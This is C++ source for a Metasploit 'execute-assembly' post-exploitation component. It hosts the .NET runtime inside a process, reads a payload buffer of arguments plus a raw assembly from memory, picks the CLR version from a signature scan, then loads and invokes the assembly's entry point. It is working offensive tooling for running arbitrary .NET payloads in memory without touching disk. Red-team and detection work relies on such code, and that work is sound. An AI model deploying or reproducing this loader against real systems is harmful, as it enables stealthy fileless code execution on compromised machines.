// Author: B4rtik (@b4rtik)
// Project: Execute Assembly (https://github.com/b4rtik/metasploit-execute-assembly)
// License: BSD 3-Clause
// based on 
// https://github.com/etormadiv/HostingCLR
// by Etor Madiv

#include "stdafx.h"
#include "HostingCLR.h"

#define RAW_ASSEMBLY_LENGTH 1024000
#define RAW_AGRS_LENGTH 1024

unsigned char arg_s[RAW_AGRS_LENGTH];
unsigned char allData[RAW_ASSEMBLY_LENGTH + RAW_AGRS_LENGTH];
unsigned char rawData[RAW_ASSEMBLY_LENGTH];

char sig_40[] = { 0x76,0x34,0x2E,0x30,0x2E,0x33,0x30,0x33,0x31,0x39 };
char sig_20[] = { 0x76,0x32,0x2E,0x30,0x2E,0x35,0x30,0x37,0x32,0x37 };

int executeSharp(LPVOID lpPayload)
{
	
	HRESULT hr;

	ICLRMetaHost* pMetaHost = NULL;
	ICLRRuntimeInfo* pRuntimeInfo = NULL;
	BOOL bLoadable;
	ICorRuntimeHost* pRuntimeHost = NULL;
	IUnknownPtr pAppDomainThunk = NULL;
	_AppDomainPtr pDefaultAppDomain = NULL;
	_AssemblyPtr pAssembly = NULL;
	SAFEARRAYBOUND rgsabound[1];
	SIZE_T readed;
	_MethodInfoPtr pMethodInfo = NULL;
	VARIANT retVal;
	VARIANT obj;
	SAFEARRAY *psaStaticMethodArgs;
	VARIANT vtPsa;

	rgsabound[0].cElements = RAW_ASSEMBLY_LENGTH;
	rgsabound[0].lLbound = 0;
	SAFEARRAY* pSafeArray = SafeArrayCreate(VT_UI1, 1, rgsabound);

	void* pvData = NULL;
	hr = SafeArrayAccessData(pSafeArray, &pvData);

	if (FAILED(hr))
	{
		printf("Failed SafeArrayAccessData w/hr 0x%08lx\n", hr);
		return -1;
	}

	//Reading memory parameter + assembly
	ReadProcessMemory(GetCurrentProcess(), lpPayload, allData, RAW_ASSEMBLY_LENGTH + RAW_AGRS_LENGTH, &readed);

	//Store parameters 
	memcpy(arg_s, allData, sizeof(arg_s));

	//Taking pointer to assembly
	unsigned char *offset = allData + RAW_AGRS_LENGTH;
	//Store assembly
	memcpy(pvData, offset, RAW_ASSEMBLY_LENGTH);

	LPCWSTR clrVersion;

	if(FindVersion(pvData))
	{
		clrVersion = L"v4.0.30319";
	}
	else
	{
		clrVersion = L"v2.0.50727";
	}

	hr = SafeArrayUnaccessData(pSafeArray);

	if (FAILED(hr))
	{
		printf("Failed SafeArrayUnaccessData w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_ICLRMetaHost, (VOID**)&pMetaHost);

	if(FAILED(hr))
	{
		printf("CLRCreateInstance failed w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = pMetaHost->GetRuntime(clrVersion, IID_ICLRRuntimeInfo, (VOID**)&pRuntimeInfo);

	if(FAILED(hr))
	{
		printf("ICLRMetaHost::GetRuntime failed w/hr 0x%08lx\n", hr);
		return -1;
	}
	
	hr = pRuntimeInfo->IsLoadable(&bLoadable);

	if(FAILED(hr) || !bLoadable)
	{
		printf("ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (VOID**)&pRuntimeHost);

	if(FAILED(hr))
	{
		printf("ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = pRuntimeHost->Start();
	
	if(FAILED(hr))
	{
		printf("CLR failed to start w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = pRuntimeHost->GetDefaultDomain(&pAppDomainThunk);

	if(FAILED(hr))
	{
		printf("ICorRuntimeHost::GetDefaultDomain failed w/hr 0x%08lx\n", hr);
		return -1;
	}

	printf("ICorRuntimeHost->GetDefaultDomain(...) succeeded\n");

	hr = pAppDomainThunk->QueryInterface(__uuidof(_AppDomain), (VOID**) &pDefaultAppDomain);

	if(FAILED(hr))
	{
		printf("Failed to get default AppDomain w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = pDefaultAppDomain->Load_3(pSafeArray, &pAssembly);

	if(FAILED(hr))
	{
		printf("Failed pDefaultAppDomain->Load_3 w/hr 0x%08lx\n", hr);
		return -1;
	}

	hr = pAssembly->get_EntryPoint(&pMethodInfo);

	if(FAILED(hr))
	{
		printf("Failed pAssembly->get_EntryPoint w/hr 0x%08lx\n", hr);
		return -1;
	}

	ZeroMemory(&retVal, sizeof(VARIANT));
	ZeroMemory(&obj, sizeof(VARIANT));
	
	obj.vt = VT_NULL;
	vtPsa.vt = (VT_ARRAY | VT_BSTR);

	//Managing parameters
	if(arg_s[0] != '\x00')
	{
		//if we have at least 1 parameter set cEleemnt to 1
		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);

		int arg_n = 1;
		//Parameters number
		for (int i = 0; i < strlen((char*)arg_s); i++)
		{
			if (arg_s[i] == ' ')
				arg_n++;
		}
		
		//Set cElement to parametes number
		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, arg_n);

		char delim[] = " ";
		char *next_token = NULL;
		char *ptr = strtok_s((char*)arg_s, delim, &next_token);

		long i = 0;
		//Wallking parameters
		while (i < arg_n && ptr != NULL)
		{
			OLECHAR *sOleText1 = new OLECHAR[strlen(ptr) + 1];
			hr = mbstowcs(sOleText1, ptr, strlen(ptr) + 1);
			BSTR strParam1 = SysAllocString(sOleText1);

			SafeArrayPutElement(vtPsa.parray, &i, strParam1);
			ptr = strtok_s(NULL, delim, &next_token);
			i++;
		}
		long iEventCdIdx(0);
		hr = SafeArrayPutElement(psaStaticMethodArgs, &iEventCdIdx, &vtPsa);
	}
	else
	{
		//if no parameters set cEleemnt to 0
		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
	}

	//Assembly execution
	hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);

	if(FAILED(hr))
	{
		printf("Failed pMethodInfo->Invoke_3  w/hr 0x%08lx\n", hr);
		return -1;
	}

	wprintf(L"Succeeded\n");
	
	return 0;
}

VOID Execute(LPVOID lpPayload)
{
	if (!AttachConsole(-1))
		AllocConsole();

	wprintf(L"Execution started\n");

	executeSharp(lpPayload);

	wprintf(L"Execution end\n");

}

BOOL FindVersion(void * assembly)
{
	char* assembly_c;
	assembly_c = (char*)assembly;
	
	for (int i = 0; i < RAW_ASSEMBLY_LENGTH; i++)
	{
		for (int j = 0; j < 10; j++)
		{
			if (sig_40[j] != assembly_c[i + j])
			{
				break;
			}
			else
			{
				if (j == (10 - 1))
				{
					return TRUE;
				}
			}
		}
	}

	return FALSE;
}




